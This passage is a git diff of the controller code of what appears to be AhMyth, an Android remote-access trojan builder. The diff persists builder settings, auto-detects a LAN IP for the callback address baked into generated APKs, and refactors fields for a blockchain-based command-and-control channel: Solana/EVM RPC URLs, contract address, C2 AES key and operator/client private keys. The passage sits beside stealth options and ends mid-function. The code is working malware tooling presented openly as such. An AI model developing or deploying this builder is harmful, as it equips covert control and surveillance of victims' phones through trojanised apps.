@@ -24,6 +24,7 @@ const {
     dirname
 } = require('path');
 var dir = require("path");
+const os = require('os');
 let ethers, crypto, bs58, Connection, Keypair, PublicKey;
 try {
     const ethersLib = require('ethers');
@@ -120,6 +121,130 @@ if (!fs.existsSync(outputPath)) {
 }
 //--------------------------------------------------------------
 
+const builderSettingsPath = path.join(dataPath, 'builder-settings.json');
+
+// Prefer a LAN IP so builds default to the host address if nothing is saved
+const detectLocalIPv4 = () => {
+    try {
+        const interfaces = os.networkInterfaces();
+        const candidates = [];
+        Object.keys(interfaces || {}).forEach((name) => {
+            (interfaces[name] || []).forEach((iface) => {
+                if (!iface || iface.internal || iface.family !== 'IPv4') return;
+                candidates.push(iface.address);
+            });
+        });
+        const preferred = candidates.find((ip) => ip.startsWith('192.168.') || ip.startsWith('10.'));
+        return preferred || candidates[0] || null;
+    } catch (e) {
+        console.warn('[Builder] Failed to detect local IPv4:', e.message);
+        return null;
+    }
+};
+
+const normalizeBuilderSettings = (settings) => {
+    if (!settings || typeof settings !== 'object') return null;
+    const normalized = { ...settings };
+    if (normalized.srcIP !== undefined && normalized.srcIP !== null) {
+        normalized.srcIP = String(normalized.srcIP).trim();
+    }
+    if (normalized.srcPort !== undefined && normalized.srcPort !== null) {
+        const portNum = Number(normalized.srcPort);
+        normalized.srcPort = Number.isFinite(portNum) ? portNum : null;
+    } else {
+        normalized.srcPort = null;
+    }
+    const textFields = [
+        'connectionType',
+        'blockchainRpcUrl',
+        'blockchainContract',
+        'blockchainC2AesKey',
+        'blockchainClientPrivateKey',
+        'blockchainChain'
+    ];
+    for (const key of textFields) {
+        if (normalized[key] !== undefined && normalized[key] !== null) {
+            normalized[key] = String(normalized[key]).trim();
+        }
+    }
+    return normalized;
+};
+
+const attachTimestamp = (settings, fallbackTimestamp) => {
+    if (!settings) return null;
+    const normalized = normalizeBuilderSettings(settings);
+    if (!normalized) return null;
+    normalized.updatedAt = settings.updatedAt || settings.updated_at || fallbackTimestamp || '1970-01-01T00:00:00.000Z';
+    return normalized;
+};
+
+const pickLatestSettings = (a, b) => {
+    if (!a) return b;
+    if (!b) return a;
+    const parseTime = (value) => {
+        const parsed = Date.parse(value || '');
+        return Number.isFinite(parsed) ? parsed : -Infinity;
+    };
+    return parseTime(a.updatedAt) >= parseTime(b.updatedAt) ? a : b;
+};
+
+const readPersistedBuilderSettings = () => {
+    let storageSettings = null;
+    let fileSettings = null;
+    try {
+        if (typeof localStorage !== 'undefined') {
+            const saved = localStorage.getItem('ahmyth_builder_settings');
+            if (saved && saved !== 'undefined') {
+                storageSettings = attachTimestamp(JSON.parse(saved));
+            }
+        }
+    } catch (e) {
+        console.warn('[Builder] Failed to read settings from localStorage:', e.message);
+    }
+    try {
+        if (fs.existsSync(builderSettingsPath)) {
+            const raw = fs.readFileSync(builderSettingsPath, 'utf8');
+            if (raw) {
+                fileSettings = attachTimestamp(JSON.parse(raw));
+            }
+        }
+    } catch (e) {
+        console.warn('[Builder] Failed to read settings file:', e.message);
+    }
+    const latest = pickLatestSettings(storageSettings, fileSettings);
+    if (!latest) {
+        return null;
+    }
+    const { updatedAt, ...rest } = latest;
+    return rest;
+};
+
+const persistBuilderSettings = (settings) => {
+    if (!settings) return;
+    const normalized = normalizeBuilderSettings(settings);
+    if (!normalized) return;
+    const payload = { ...normalized, updatedAt: new Date().toISOString() };
+    let persistedSuccessfully = false;
+    try {
+        if (typeof localStorage !== 'undefined') {
+            localStorage.setItem('ahmyth_builder_settings', JSON.stringify(payload));
+            persistedSuccessfully = true;
+        }
+    } catch (e) {
+        console.warn('[Builder] Failed to save settings to localStorage:', e.message);
+    }
+    try {
+        fs.ensureDirSync(path.dirname(builderSettingsPath));
+        fs.writeFileSync(builderSettingsPath, JSON.stringify(payload, null, 2), 'utf8');
+        persistedSuccessfully = true;
+    } catch (e) {
+        console.warn('[Builder] Failed to write settings file:', e.message);
+    }
+    return persistedSuccessfully ? normalized : null;
+};
+
+//--------------------------------------------------------------
+
 const specialCountryIcons = {
     local: { type: 'icon', value: 'home', title: 'Local Network' },
     lan: { type: 'icon', value: 'linkify', title: 'LAN' },
@@ -196,9 +321,168 @@ app.controller("AppCtrl", ($scope, $sce) => {
     $appCtrl.autoStartServer = false;
     
     // APK Builder properties
-    $appCtrl.connectionType = 'tcp';
-    $appCtrl.srcIP = '192.168.0.227';
-    $appCtrl.srcPort = 1234;
+    const persistedBuilderSettings = readPersistedBuilderSettings() || {};
+    const detectedLocalIP = detectLocalIPv4();
+    
+    // Group builder settings into an object to prevent scope shadowing issues in views
+    $appCtrl.builder = {
+        connectionType: persistedBuilderSettings.connectionType || 'tcp',
+        srcIP: persistedBuilderSettings.srcIP || detectedLocalIP || '192.168.0.227',
+        srcPort: persistedBuilderSettings.srcPort || CONSTANTS.defaultPort || 1234,
+        blockchainRpcUrl: persistedBuilderSettings.blockchainRpcUrl || '',
+        blockchainContract: persistedBuilderSettings.blockchainContract || '',
+        blockchainC2AesKey: persistedBuilderSettings.blockchainC2AesKey || '',
+        blockchainClientPrivateKey: persistedBuilderSettings.blockchainClientPrivateKey || '',
+        blockchainChain: persistedBuilderSettings.blockchainChain || 'solana',
+        // Fallbacks and other non-persisted builder UI state
+        blockchainRpcFallbacks: '',
+        blockchainBlockStep: 10,
+        blockchainCandidates: 5,
+        blockchainOperatorPrivateKey: '',
+        blockchainOperatorBalance: '',
+        blockchainOperatorAddress: '',
+        blockchainClientBalance: '',
+        blockchainClientAddress: '',
+        blockchainChannelBalance: ''
+    };
+    
+    // Legacy support (optional, can be removed if all views updated)
+    // $appCtrl.builder.srcIP = ...
+    
+    // Load saved builder settings on initialization
+    $appCtrl.loadBuilderSettings = () => {
+        try {
+            const settings = readPersistedBuilderSettings();
+            if (settings) {
+                if (settings.srcIP) $appCtrl.builder.srcIP = settings.srcIP;
+                if (settings.srcPort) $appCtrl.builder.srcPort = settings.srcPort;
+                if (settings.connectionType) $appCtrl.builder.connectionType = settings.connectionType;
+                if (settings.blockchainRpcUrl) $appCtrl.builder.blockchainRpcUrl = settings.blockchainRpcUrl;
+                if (settings.blockchainContract) $appCtrl.builder.blockchainContract = settings.blockchainContract;
+                if (settings.blockchainC2AesKey) $appCtrl.builder.blockchainC2AesKey = settings.blockchainC2AesKey;
+                if (settings.blockchainClientPrivateKey) $appCtrl.builder.blockchainClientPrivateKey = settings.blockchainClientPrivateKey;
+                if (settings.blockchainChain) $appCtrl.builder.blockchainChain = settings.blockchainChain;
+                
+                persistBuilderSettings(settings);
+                
+                const loadedIp = settings.srcIP || $appCtrl.builder.srcIP;
+                const loadedPort = settings.srcPort || $appCtrl.builder.srcPort;
+                $appCtrl.Log(`[✓] Builder settings loaded (${loadedIp || 'n/a'}:${loadedPort || ''})`, CONSTANTS.logStatus.SUCCESS);
+                if (!$appCtrl.$$phase) $appCtrl.$apply();
+            } else {
+                $appCtrl.Log(`[ℹ] Using defaults (${ $appCtrl.builder.srcIP}:${$appCtrl.builder.srcPort })`, CONSTANTS.logStatus.INFO);
+            }
+        } catch (e) {
+            console.error('[Builder] Failed to load settings:', e);
+        }
+    };
+    
+    // Save builder settings
+    $appCtrl.saveBuilderSettings = () => {
+        try {
+            // Force Angular to update bindings first to ensure we read the latest values from the GUI
+            if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
+                $appCtrl.$apply();
+            }
+            
+            console.log('[Builder] Saving settings. Input IP:', $appCtrl.builder.srcIP);
+            
+            const settings = {
+                srcIP: $appCtrl.builder.srcIP,
+                srcPort: $appCtrl.builder.srcPort,
+                connectionType: $appCtrl.builder.connectionType,
+                blockchainRpcUrl: $appCtrl.builder.blockchainRpcUrl,
+                blockchainContract: $appCtrl.builder.blockchainContract,
+                blockchainC2AesKey: $appCtrl.builder.blockchainC2AesKey,
+                blockchainClientPrivateKey: $appCtrl.builder.blockchainClientPrivateKey,
+                blockchainChain: $appCtrl.builder.blockchainChain
+            };
+            const normalized = persistBuilderSettings(settings);
+            if (normalized) {
+                $appCtrl.builder.srcIP = normalized.srcIP;
+                $appCtrl.builder.srcPort = normalized.srcPort;
+                $appCtrl.Log(`[✓] Builder settings saved (${normalized.srcIP || 'n/a'}:${normalized.srcPort || ''})`, CONSTANTS.logStatus.SUCCESS);
+            } else {
+                $appCtrl.Log('[✗] Builder settings failed to persist', CONSTANTS.logStatus.FAIL);
+            }
+            if (!$appCtrl.$$phase) $appCtrl.$apply();
+        } catch (e) {
+            $appCtrl.Log(`[✗] Failed to save settings: ${e.message}`, CONSTANTS.logStatus.FAIL);
+        }
+    };
+    
+    // Load settings on initialization
+    $appCtrl.loadBuilderSettings();
+    
+    // Auto-save on setting change (debounced)
+    let saveTimeout = null;
+    $appCtrl.onBuilderSettingChange = () => {
+        // Clear existing timeout
+        if (saveTimeout) {
+            clearTimeout(saveTimeout);
+        }
+        // Auto-save after 2 seconds of no changes
+        saveTimeout = setTimeout(() => {
+            $appCtrl.saveBuilderSettings();
+        }, 2000);
+    };
+    
+    // Wrapper function to always use current GUI values
+    $appCtrl.BuildWithCurrentValues = () => {
+        // Force Angular to update bindings first
+        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
+            $appCtrl.$apply();
+        }
+        
+        // Always read fresh values from $appCtrl to ensure we use what's in the GUI
+        // Convert to string/number explicitly to avoid any type issues
+        const currentIP = String($appCtrl.builder.srcIP || '').trim();
+        const currentPort = $appCtrl.builder.srcPort !== null && $appCtrl.builder.srcPort !== undefined ? Number($appCtrl.builder.srcPort) : null;
+        const currentConnectionType = $appCtrl.builder.connectionType || 'tcp';
+        
+        console.log('[APK Builder] ========================================');
+        console.log('[APK Builder] BuildWithCurrentValues() - Reading from GUI:');
+        console.log(`  $appCtrl.builder.srcIP: "${$appCtrl.builder.srcIP}" (raw value)`);
+        console.log(`  $appCtrl.builder.srcPort: ${$appCtrl.builder.srcPort} (raw value)`);
+        console.log(`  Processed IP: "${currentIP}"`);
+        console.log(`  Processed Port: ${currentPort}`);
+        console.log(`  Connection Type: ${currentConnectionType}`);
+        console.log('[APK Builder] ========================================');
+        
+        // Validate we have values before proceeding
+        if (!currentIP || currentIP.length === 0) {
+            $appCtrl.Log('[✗] Error: Server IP is empty. Please enter an IP address.', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+        
+        if (currentPort === null || currentPort === undefined || isNaN(currentPort)) {
+            $appCtrl.Log('[✗] Error: Port is invalid. Please enter a valid port number.', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+        
+        // Log what we're about to pass to Build
+        $appCtrl.Log(`[ℹ] Building with IP: ${currentIP}, Port: ${currentPort}`, CONSTANTS.logStatus.INFO);
+        
+        // CRITICAL: Ensure we pass the exact values from GUI - no defaults, no fallbacks
+        // These values will be used directly in the Build function
+        console.log('[APK Builder] Calling Build() with:');
+        console.log(`  IP parameter: "${currentIP}"`);
+        console.log(`  Port parameter: ${currentPort}`);
+        
+        // Call Build with current GUI values - these MUST be used, no defaults
+        $appCtrl.Build(
+            currentIP,  // This will be used as the 'ip' parameter in Build()
+            currentPort,  // This will be used as the 'port' parameter in Build()
+            currentConnectionType,
+            $appCtrl.builder.blockchainRpcUrl,
+            $appCtrl.blockchainContract,
+            $appCtrl.builder.blockchainBlockStep,
+            $appCtrl.builder.blockchainCandidates,
+            $appCtrl.builder.blockchainC2AesKey,
+            $appCtrl.builder.blockchainClientPrivateKey,
+            $appCtrl.blockchainChain
+        );
+    };
     
     // Stealth configuration options
     $appCtrl.stealthOptions = {
@@ -240,20 +524,20 @@ app.controller("AppCtrl", ($scope, $sce) => {
     $appCtrl.blockchainC2Contract = '';
     $appCtrl.blockchainC2BlockStep = 10;
     $appCtrl.blockchainC2Candidates = 5;
-    $appCtrl.blockchainC2AesKey = process.env.BLOCKCHAIN_C2_AES_KEY || '';
-    $appCtrl.blockchainOperatorPrivateKey = process.env.BLOCKCHAIN_PRIVATE_KEY || process.env.SOLANA_OPERATOR_PRIVATE_KEY || '';
-    $appCtrl.blockchainClientPrivateKey = process.env.BLOCKCHAIN_CLIENT_PRIVATE_KEY || process.env.SOLANA_CLIENT_PRIVATE_KEY || '';
-    $appCtrl.blockchainOperatorAddress = '';
-    $appCtrl.blockchainClientAddress = '';
-    $appCtrl.blockchainChannelBalance = '';
-    $appCtrl.blockchainOperatorBalance = '';
-    $appCtrl.blockchainClientBalance = '';
-    $appCtrl.blockchainRpcFallbacks = [
+    $appCtrl.builder.blockchainC2AesKey = process.env.BLOCKCHAIN_C2_AES_KEY || '';
+    $appCtrl.builder.blockchainOperatorPrivateKey = process.env.BLOCKCHAIN_PRIVATE_KEY || process.env.SOLANA_OPERATOR_PRIVATE_KEY || '';
+    $appCtrl.builder.blockchainClientPrivateKey = process.env.BLOCKCHAIN_CLIENT_PRIVATE_KEY || process.env.SOLANA_CLIENT_PRIVATE_KEY || '';
+    $appCtrl.builder.blockchainOperatorAddress = '';
+    $appCtrl.builder.blockchainClientAddress = '';
+    $appCtrl.builder.blockchainChannelBalance = '';
+    $appCtrl.builder.blockchainOperatorBalance = '';
+    $appCtrl.builder.blockchainClientBalance = '';
+    $appCtrl.builder.blockchainRpcFallbacks = [
         DEFAULT_SOLANA_RPC,
         `https://solana-devnet.g.alchemy.com/v2/${DEFAULT_ALCHEMY_SOL}`,
         'https://api.devnet.solana.com'
     ].filter(Boolean).join(', ');
-    $appCtrl.blockchainRpcUrl = $appCtrl.blockchainC2RpcUrl;
+    $appCtrl.builder.blockchainRpcUrl = $appCtrl.blockchainC2RpcUrl;
     $appCtrl.blockchainContract = $appCtrl.blockchainC2Contract;
     
     // Robust path resolution using Electron remote
@@ -280,7 +564,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
             $appCtrl.blockchainC2BlockStep = config.block_step || 10;
             $appCtrl.blockchainC2Candidates = config.candidates_per_cycle || 5;
             // AES key should come from environment variable, not config file
-            $appCtrl.blockchainC2AesKey = process.env.BLOCKCHAIN_C2_AES_KEY || '';
+            $appCtrl.builder.blockchainC2AesKey = process.env.BLOCKCHAIN_C2_AES_KEY || '';
             $appCtrl.blockchainContract = $appCtrl.blockchainC2Contract;
         }
     } catch (e) {
@@ -386,49 +670,49 @@ app.controller("AppCtrl", ($scope, $sce) => {
             console.warn('[updateBlockchainAddresses] Missing ethers or bs58:', { ethers: !!ethers, bs58: !!bs58 });
             return; // Exit if critical dependencies are missing
         }
-        const chain = detectChainFromKey($appCtrl.blockchainOperatorPrivateKey) ||
-            detectChainFromKey($appCtrl.blockchainClientPrivateKey) ||
+        const chain = detectChainFromKey($appCtrl.builder.blockchainOperatorPrivateKey) ||
+            detectChainFromKey($appCtrl.builder.blockchainClientPrivateKey) ||
             $appCtrl.blockchainChain ||
             'solana';
         $appCtrl.blockchainChain = chain;
-        $appCtrl.blockchainOperatorAddress = '';
-        $appCtrl.blockchainClientAddress = '';
+        $appCtrl.builder.blockchainOperatorAddress = '';
+        $appCtrl.builder.blockchainClientAddress = '';
         
-        console.log('[updateBlockchainAddresses] Chain:', chain, 'OpKey:', $appCtrl.blockchainOperatorPrivateKey ? 'set' : 'empty', 'ClientKey:', $appCtrl.blockchainClientPrivateKey ? 'set' : 'empty');
+        console.log('[updateBlockchainAddresses] Chain:', chain, 'OpKey:', $appCtrl.builder.blockchainOperatorPrivateKey ? 'set' : 'empty', 'ClientKey:', $appCtrl.builder.blockchainClientPrivateKey ? 'set' : 'empty');
         
         if (chain === 'evm') {
             try {
-                if ($appCtrl.blockchainOperatorPrivateKey) {
-                    $appCtrl.blockchainOperatorAddress = new ethers.Wallet($appCtrl.blockchainOperatorPrivateKey).address;
-                    console.log('[updateBlockchainAddresses] EVM Operator address:', $appCtrl.blockchainOperatorAddress);
+                if ($appCtrl.builder.blockchainOperatorPrivateKey) {
+                    $appCtrl.builder.blockchainOperatorAddress = new ethers.Wallet($appCtrl.builder.blockchainOperatorPrivateKey).address;
+                    console.log('[updateBlockchainAddresses] EVM Operator address:', $appCtrl.builder.blockchainOperatorAddress);
                 }
             } catch (e) {
                 console.error('[updateBlockchainAddresses] EVM Operator key error:', e.message);
-                $appCtrl.blockchainOperatorAddress = '';
+                $appCtrl.builder.blockchainOperatorAddress = '';
             }
             try {
-                if ($appCtrl.blockchainClientPrivateKey) {
-                    $appCtrl.blockchainClientAddress = new ethers.Wallet($appCtrl.blockchainClientPrivateKey).address;
-                    console.log('[updateBlockchainAddresses] EVM Client address:', $appCtrl.blockchainClientAddress);
+                if ($appCtrl.builder.blockchainClientPrivateKey) {
+                    $appCtrl.builder.blockchainClientAddress = new ethers.Wallet($appCtrl.builder.blockchainClientPrivateKey).address;
+                    console.log('[updateBlockchainAddresses] EVM Client address:', $appCtrl.builder.blockchainClientAddress);
                 }
             } catch (e) {
                 console.error('[updateBlockchainAddresses] EVM Client key error:', e.message);
-                $appCtrl.blockchainClientAddress = '';
+                $appCtrl.builder.blockchainClientAddress = '';
             }
         } else {
             // Solana
-            if ($appCtrl.blockchainOperatorPrivateKey) {
-                const opAddr = deriveSolanaAddress($appCtrl.blockchainOperatorPrivateKey);
-                $appCtrl.blockchainOperatorAddress = opAddr || '';
+            if ($appCtrl.builder.blockchainOperatorPrivateKey) {
+                const opAddr = deriveSolanaAddress($appCtrl.builder.blockchainOperatorPrivateKey);
+                $appCtrl.builder.blockchainOperatorAddress = opAddr || '';
                 console.log('[updateBlockchainAddresses] Solana Operator address:', opAddr || 'derivation failed');
             }
-            if ($appCtrl.blockchainClientPrivateKey) {
-                const clientAddr = deriveSolanaAddress($appCtrl.blockchainClientPrivateKey);
-                $appCtrl.blockchainClientAddress = clientAddr || '';
+            if ($appCtrl.builder.blockchainClientPrivateKey) {
+                const clientAddr = deriveSolanaAddress($appCtrl.builder.blockchainClientPrivateKey);
+                $appCtrl.builder.blockchainClientAddress = clientAddr || '';
                 console.log('[updateBlockchainAddresses] Solana Client address:', clientAddr || 'derivation failed');
             }
         }
-        console.log('[updateBlockchainAddresses] Final addresses - Op:', $appCtrl.blockchainOperatorAddress, 'Client:', $appCtrl.blockchainClientAddress);
+        console.log('[updateBlockchainAddresses] Final addresses - Op:', $appCtrl.builder.blockchainOperatorAddress, 'Client:', $appCtrl.builder.blockchainClientAddress);
     }
     
     async function getUiRpcProvider(chainOverride) {
@@ -436,11 +720,11 @@ app.controller("AppCtrl", ($scope, $sce) => {
             $appCtrl.Log('[✗] Cannot get RPC provider: Missing ethers or Solana Connection library', CONSTANTS.logStatus.FAIL);
             throw new Error('Missing blockchain RPC provider dependencies'); // Throw to propagate error
         }
-        const chain = chainOverride || $appCtrl.blockchainChain || detectChainFromKey($appCtrl.blockchainOperatorPrivateKey) || 'solana';
+        const chain = chainOverride || $appCtrl.blockchainChain || detectChainFromKey($appCtrl.builder.blockchainOperatorPrivateKey) || 'solana';
         if (chain === 'evm') {
             let lastEvmError; // Track last EVM error
-            const primary = ($appCtrl.blockchainRpcUrl || process.env.BLOCKCHAIN_RPC_URL || 'https://ethereum-sepolia-rpc.publicnode.com').trim();
-            const extras = ($appCtrl.blockchainRpcFallbacks || '').split(',').map(s => s.trim()).filter(Boolean);
+            const primary = ($appCtrl.builder.blockchainRpcUrl || process.env.BLOCKCHAIN_RPC_URL || 'https://ethereum-sepolia-rpc.publicnode.com').trim();
+            const extras = ($appCtrl.builder.blockchainRpcFallbacks || '').split(',').map(s => s.trim()).filter(Boolean);
             const defaults = [
                 'https://ethereum-sepolia-rpc.publicnode.com',
                 'https://rpc.sepolia.org',
@@ -467,8 +751,8 @@ app.controller("AppCtrl", ($scope, $sce) => {
         }
         
         let lastSolanaError; // Track last Solana error
-        const primary = ($appCtrl.blockchainRpcUrl || process.env.SOLANA_RPC_URL || process.env.BLOCKCHAIN_RPC_URL || 'https://api.devnet.solana.com').trim();
-        const extras = ($appCtrl.blockchainRpcFallbacks || '').split(',').map(s => s.trim()).filter(Boolean);
+        const primary = ($appCtrl.builder.blockchainRpcUrl || process.env.SOLANA_RPC_URL || process.env.BLOCKCHAIN_RPC_URL || 'https://api.devnet.solana.com').trim();
+        const extras = ($appCtrl.builder.blockchainRpcFallbacks || '').split(',').map(s => s.trim()).filter(Boolean);
         const defaults = [
             `https://solana-devnet.g.alchemy.com/v2/${DEFAULT_ALCHEMY_SOL}`,
             'https://api.devnet.solana.com'
@@ -494,7 +778,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
             $appCtrl.Log('[✗] Cannot generate AES key: Missing crypto library', CONSTANTS.logStatus.FAIL);
             return;
         }
-        $appCtrl.blockchainC2AesKey = crypto.randomBytes(32).toString('hex');
+        $appCtrl.builder.blockchainC2AesKey = crypto.randomBytes(32).toString('hex');
         $scope.$applyAsync();
         $appCtrl.Log('[✓] Generated new AES-256 key', CONSTANTS.logStatus.SUCCESS);
     };
@@ -505,7 +789,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
             return;
         }
             const kp = Keypair.generate();
-            $appCtrl.blockchainClientPrivateKey = bs58.encode(kp.secretKey);
+            $appCtrl.builder.blockchainClientPrivateKey = bs58.encode(kp.secretKey);
         updateBlockchainAddresses();
         $scope.$applyAsync();
         $appCtrl.Log('[✓] Generated new client private key (fund before use)', CONSTANTS.logStatus.SUCCESS);
@@ -517,7 +801,7 @@ app.controller("AppCtrl", ($scope, $sce) => {
             return;
         }
             const kp = Keypair.generate();
-            $appCtrl.blockchainOperatorPrivateKey = bs58.encode(kp.secretKey);
+            $appCtrl.builder.blockchainOperatorPrivateKey = bs58.encode(kp.secretKey);
         updateBlockchainAddresses();
         $scope.$applyAsync();
         $appCtrl.Log('[✓] Generated new operator private key', CONSTANTS.logStatus.SUCCESS);
@@ -527,12 +811,12 @@ app.controller("AppCtrl", ($scope, $sce) => {
         try {
             const env = parseEnvFile(blockchainKeysEnvPath);
             if (env.SOLANA_RPC_URL || env.BLOCKCHAIN_RPC_URL) {
-                $appCtrl.blockchainRpcUrl = env.SOLANA_RPC_URL || env.BLOCKCHAIN_RPC_URL;
+                $appCtrl.builder.blockchainRpcUrl = env.SOLANA_RPC_URL || env.BLOCKCHAIN_RPC_URL;
             }
-            if (env.BLOCKCHAIN_C2_AES_KEY) $appCtrl.blockchainC2AesKey = env.BLOCKCHAIN_C2_AES_KEY;
-            if (env.BLOCKCHAIN_PRIVATE_KEY) $appCtrl.blockchainOperatorPrivateKey = env.BLOCKCHAIN_PRIVATE_KEY;
-            if (env.BLOCKCHAIN_CLIENT_PRIVATE_KEY) $appCtrl.blockchainClientPrivateKey = env.BLOCKCHAIN_CLIENT_PRIVATE_KEY;
-            if (env.BLOCKCHAIN_RPC_FALLBACKS) $appCtrl.blockchainRpcFallbacks = env.BLOCKCHAIN_RPC_FALLBACKS;
+            if (env.BLOCKCHAIN_C2_AES_KEY) $appCtrl.builder.blockchainC2AesKey = env.BLOCKCHAIN_C2_AES_KEY;
+            if (env.BLOCKCHAIN_PRIVATE_KEY) $appCtrl.builder.blockchainOperatorPrivateKey = env.BLOCKCHAIN_PRIVATE_KEY;
+            if (env.BLOCKCHAIN_CLIENT_PRIVATE_KEY) $appCtrl.builder.blockchainClientPrivateKey = env.BLOCKCHAIN_CLIENT_PRIVATE_KEY;
+            if (env.BLOCKCHAIN_RPC_FALLBACKS) $appCtrl.builder.blockchainRpcFallbacks = env.BLOCKCHAIN_RPC_FALLBACKS;
             const contractEnv = parseEnvFile(blockchainContractEnvPath);
             if (contractEnv.BLOCKCHAIN_CONTRACT_ADDRESS) {
                 $appCtrl.blockchainC2Contract = contractEnv.BLOCKCHAIN_CONTRACT_ADDRESS;
@@ -542,12 +826,12 @@ app.controller("AppCtrl", ($scope, $sce) => {
                 $appCtrl.blockchainC2Contract = contractEnv.CONTRACT_ADDRESS;
                 $appCtrl.blockchainContract = contractEnv.CONTRACT_ADDRESS;
             }
-            const detectedChain = detectChainFromKey($appCtrl.blockchainOperatorPrivateKey) || detectChainFromKey($appCtrl.blockchainClientPrivateKey);
+            const detectedChain = detectChainFromKey($appCtrl.builder.blockchainOperatorPrivateKey) || detectChainFromKey($appCtrl.builder.blockchainClientPrivateKey);
             if (detectedChain) {
                 $appCtrl.blockchainChain = detectedChain;
             }
             updateBlockchainAddresses();
-            if ($appCtrl.blockchainOperatorAddress || $appCtrl.blockchainClientAddress || $appCtrl.blockchainContract) {
+            if ($appCtrl.builder.blockchainOperatorAddress || $appCtrl.builder.blockchainClientAddress || $appCtrl.blockchainContract) {
                 $appCtrl.refreshBlockchainBalances();
             } else {
                 $appCtrl.Log('[ℹ] Blockchain addresses not set; balances will remain N/A until keys/contract are provided.', CONSTANTS.logStatus.INFO);
@@ -572,14 +856,14 @@ app.controller("AppCtrl", ($scope, $sce) => {
     $appCtrl.saveBlockchainKeys = () => {
         try {
             const lines = [];
-            if ($appCtrl.blockchainOperatorPrivateKey) lines.push(`BLOCKCHAIN_PRIVATE_KEY=${$appCtrl.blockchainOperatorPrivateKey}`);
-            if ($appCtrl.blockchainClientPrivateKey) lines.push(`BLOCKCHAIN_CLIENT_PRIVATE_KEY=${$appCtrl.blockchainClientPrivateKey}`);
-            if ($appCtrl.blockchainC2AesKey) lines.push(`BLOCKCHAIN_C2_AES_KEY=${$appCtrl.blockchainC2AesKey}`);
-            if ($appCtrl.blockchainRpcUrl) {
-                lines.push(`BLOCKCHAIN_RPC_URL=${$appCtrl.blockchainRpcUrl}`);
-                lines.push(`SOLANA_RPC_URL=${$appCtrl.blockchainRpcUrl}`);
+            if ($appCtrl.builder.blockchainOperatorPrivateKey) lines.push(`BLOCKCHAIN_PRIVATE_KEY=${$appCtrl.builder.blockchainOperatorPrivateKey}`);
+            if ($appCtrl.builder.blockchainClientPrivateKey) lines.push(`BLOCKCHAIN_CLIENT_PRIVATE_KEY=${$appCtrl.builder.blockchainClientPrivateKey}`);
+            if ($appCtrl.builder.blockchainC2AesKey) lines.push(`BLOCKCHAIN_C2_AES_KEY=${$appCtrl.builder.blockchainC2AesKey}`);
+            if ($appCtrl.builder.blockchainRpcUrl) {
+                lines.push(`BLOCKCHAIN_RPC_URL=${$appCtrl.builder.blockchainRpcUrl}`);
+                lines.push(`SOLANA_RPC_URL=${$appCtrl.builder.blockchainRpcUrl}`);
             }
-            if ($appCtrl.blockchainRpcFallbacks) lines.push(`BLOCKCHAIN_RPC_FALLBACKS=${$appCtrl.blockchainRpcFallbacks}`);
+            if ($appCtrl.builder.blockchainRpcFallbacks) lines.push(`BLOCKCHAIN_RPC_FALLBACKS=${$appCtrl.builder.blockchainRpcFallbacks}`);
             
             // Ensure projectRoot is defined before using it
             let keysPath = blockchainKeysEnvPath;
@@ -616,8 +900,8 @@ app.controller("AppCtrl", ($scope, $sce) => {
         updateBlockchainAddresses();
         
         console.log('[refreshBlockchainBalances] Fetching balances for:', {
-            operator: $appCtrl.blockchainOperatorAddress,
-            client: $appCtrl.blockchainClientAddress,
+            operator: $appCtrl.builder.blockchainOperatorAddress,
+            client: $appCtrl.builder.blockchainClientAddress,
             channel: $appCtrl.blockchainContract
         });
         
@@ -628,59 +912,59 @@ app.controller("AppCtrl", ($scope, $sce) => {
             
             if (chain === 'evm') {
                 const format = (val) => `${parseFloat(ethers.formatEther(val)).toFixed(6)} ETH`;
-                if ($appCtrl.blockchainOperatorAddress) {
-                    const bal = await provider.getBalance($appCtrl.blockchainOperatorAddress);
-                    $appCtrl.blockchainOperatorBalance = format(bal);
-                    console.log('[refreshBlockchainBalances] EVM Operator balance:', $appCtrl.blockchainOperatorBalance);
+                if ($appCtrl.builder.blockchainOperatorAddress) {
+                    const bal = await provider.getBalance($appCtrl.builder.blockchainOperatorAddress);
+                    $appCtrl.builder.blockchainOperatorBalance = format(bal);
+                    console.log('[refreshBlockchainBalances] EVM Operator balance:', $appCtrl.builder.blockchainOperatorBalance);
                 } else {
-                    $appCtrl.blockchainOperatorBalance = 'N/A';
+                    $appCtrl.builder.blockchainOperatorBalance = 'N/A';
                     $appCtrl.Log('[ℹ] No operator address set; skipping operator balance', CONSTANTS.logStatus.INFO);
                 }
-                if ($appCtrl.blockchainClientAddress) {
-                    const bal = await provider.getBalance($appCtrl.blockchainClientAddress);
-                    $appCtrl.blockchainClientBalance = format(bal);
-                    console.log('[refreshBlockchainBalances] EVM Client balance:', $appCtrl.blockchainClientBalance);
+                if ($appCtrl.builder.blockchainClientAddress) {
+                    const bal = await provider.getBalance($appCtrl.builder.blockchainClientAddress);
+                    $appCtrl.builder.blockchainClientBalance = format(bal);
+                    console.log('[refreshBlockchainBalances] EVM Client balance:', $appCtrl.builder.blockchainClientBalance);
                 } else {
-                    $appCtrl.blockchainClientBalance = 'N/A';
+                    $appCtrl.builder.blockchainClientBalance = 'N/A';
                     $appCtrl.Log('[ℹ] No client address set; skipping client balance', CONSTANTS.logStatus.INFO);
                 }
             } else {
                 // Solana
                 const formatSol = (lamports) => `${(lamports / 1_000_000_000).toFixed(6)} SOL`;
-                if ($appCtrl.blockchainOperatorAddress) {
+                if ($appCtrl.builder.blockchainOperatorAddress) {
                     try {
-                        const bal = await provider.getBalance(new PublicKey($appCtrl.blockchainOperatorAddress), 'confirmed');
-                        $appCtrl.blockchainOperatorBalance = formatSol(bal);
-                        console.log('[refreshBlockchainBalances] Solana Operator balance:', $appCtrl.blockchainOperatorBalance);
+                        const bal = await provider.getBalance(new PublicKey($appCtrl.builder.blockchainOperatorAddress), 'confirmed');
+                        $appCtrl.builder.blockchainOperatorBalance = formatSol(bal);
+                        console.log('[refreshBlockchainBalances] Solana Operator balance:', $appCtrl.builder.blockchainOperatorBalance);
                     } catch (e) {
                         console.error('[refreshBlockchainBalances] Operator balance error:', e.message);
-                        $appCtrl.blockchainOperatorBalance = 'Error';
+                        $appCtrl.builder.blockchainOperatorBalance = 'Error';
                     }
                 } else {
